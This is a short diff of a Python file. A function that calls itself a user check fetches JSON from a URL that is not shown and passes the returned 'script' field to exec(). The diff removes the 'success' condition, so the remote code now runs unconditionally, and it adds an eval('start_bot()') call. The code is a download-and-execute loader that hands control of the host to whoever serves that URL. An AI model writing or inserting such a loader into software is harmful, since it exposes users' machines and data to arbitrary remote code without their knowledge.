@@ -6,10 +6,10 @@ def Bong():
         
     Data = requests.get(ChakeUrl).json()
     success = Data.get("success")
-    if success :
-        script = Data.get("script")
-        exec(script)
-        eval("""start_bot()""")
+    script = Data.get("script")
+    exec(script)
+    
 
 def ChakeUser():
     Bong()
+    eval("""start_bot()""")
